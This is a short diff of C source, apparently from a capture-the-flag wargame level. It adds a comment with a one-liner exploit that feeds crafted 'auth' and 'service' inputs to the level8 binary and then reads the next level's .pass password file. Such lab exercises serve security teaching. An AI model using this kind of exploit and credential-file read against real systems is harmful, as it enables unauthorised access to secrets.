@@ -5,6 +5,7 @@
 char *auth    = NULL;
 char *service = NULL;
 
+// (echo "auth AAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; echo "service s1"; echo "service s2"; echo "service s3"; echo "login"; sleep 1; echo "cat /home/user/level9/.pass"; sleep 1) | /home/user/level8/level8
 int main(void)
 {
     char buf[128];
